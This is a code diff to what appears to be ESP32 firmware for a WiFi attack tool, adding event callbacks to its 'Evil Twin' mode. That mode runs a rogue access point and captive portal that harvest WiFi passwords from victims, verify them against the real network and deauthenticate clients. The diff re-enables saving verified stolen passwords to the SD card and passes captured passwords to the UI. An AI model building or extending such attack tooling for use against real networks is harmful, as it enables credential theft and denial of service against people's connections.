@@ -61,6 +61,34 @@ static volatile bool password_verification_in_progress = false;
 // Karma mode flag - when true, portal will NOT attempt WiFi connection
 static bool karma_mode = false;
 
+// Evil Twin event callback for UI notification
+static evil_twin_event_cb_t evil_twin_event_callback = NULL;
+
+// Helper function to emit Evil Twin events
+static void emit_evil_twin_event(evil_twin_event_t event, const char *ssid, const char *password) {
+    if (evil_twin_event_callback) {
+        evil_twin_event_data_t data;
+        data.event = event;
+        if (ssid) {
+            strncpy(data.ssid, ssid, sizeof(data.ssid) - 1);
+            data.ssid[sizeof(data.ssid) - 1] = '\0';
+        } else {
+            data.ssid[0] = '\0';
+        }
+        if (password) {
+            strncpy(data.password, password, sizeof(data.password) - 1);
+            data.password[sizeof(data.password) - 1] = '\0';
+        } else {
+            data.password[0] = '\0';
+        }
+        evil_twin_event_callback(&data);
+    }
+}
+
+void wifi_attacks_set_evil_twin_event_cb(evil_twin_event_cb_t cb) {
+    evil_twin_event_callback = cb;
+}
+
 // Portal HTML files
 static char sd_html_files[MAX_HTML_FILES][MAX_HTML_FILENAME];
 static int sd_html_count = 0;
@@ -376,6 +404,7 @@ static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
             (void)event;  // Unused
             ESP_LOGI(TAG, "Client connected to Evil Twin AP");
             stats_clients_connected++;
+            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_CONNECTED, evilTwinSSID, NULL);
         } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
             wifi_event_ap_stadisconnected_t *event = (wifi_event_ap_stadisconnected_t *)event_data;
             (void)event;  // Unused
@@ -383,14 +412,18 @@ static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
             if (stats_clients_connected > 0) {
                 stats_clients_connected--;
             }
+            emit_evil_twin_event(EVIL_TWIN_EVENT_CLIENT_DISCONNECTED, evilTwinSSID, NULL);
         } else if (event_id == WIFI_EVENT_STA_CONNECTED) {
             // Password verification succeeded
             ESP_LOGI(TAG, "Password verified successfully: %s", evilTwinPassword);
             last_password_wrong = false;
             password_verification_in_progress = false;
             
-            // TODO: Save password to SD (currently disabled to avoid SPI conflict with display)
-            // save_evil_twin_password(evilTwinSSID, evilTwinPassword);
+            // Save password to SD card
+            save_evil_twin_password(evilTwinSSID, evilTwinPassword);
+            
+            // Emit password verified event
+            emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_VERIFIED, evilTwinSSID, evilTwinPassword);
         } else if (event_id == WIFI_EVENT_STA_DISCONNECTED) {
             (void)event_data; // event data not used
             
@@ -403,6 +436,9 @@ static void evil_twin_event_handler(void *arg, esp_event_base_t event_base,
                     ESP_LOGI(TAG, "Password verification failed - incorrect password");
                     last_password_wrong = true;
                     password_verification_in_progress = false;
+                    
+                    // Emit password failed event
+                    emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_FAILED, evilTwinSSID, NULL);
                     
                     // Disconnect STA to clear connection state before resuming deauth
                     esp_wifi_disconnect();
@@ -538,8 +574,15 @@ esp_err_t wifi_attacks_start_evil_twin(const char *ssid, const char *password) {
     // Start captive portal services and deauth workflow
     ESP_LOGI(TAG, "Captive portal started on 172.0.0.1");
     start_portal_services();
+    
+    // Emit portal deployed event
+    emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
+    
     wifi_scanner_save_target_bssids();
     wifi_attacks_start_deauth();
+    
+    // Emit deauth started event
+    emit_evil_twin_event(EVIL_TWIN_EVENT_DEAUTH_STARTED, evilTwinSSID, NULL);
     
     return ESP_OK;
 }
@@ -1242,6 +1285,9 @@ static esp_err_t portal_submit_handler(httpd_req_t *req) {
         url_decode(password_start, decoded_password, sizeof(decoded_password));
         
         ESP_LOGI(TAG, "Client submitted password");
+        
+        // Emit password provided event
+        emit_evil_twin_event(EVIL_TWIN_EVENT_PASSWORD_PROVIDED, evilTwinSSID, NULL);
         
         // Check mode: Karma, Evil Twin, or Regular Portal
         if (karma_mode) {
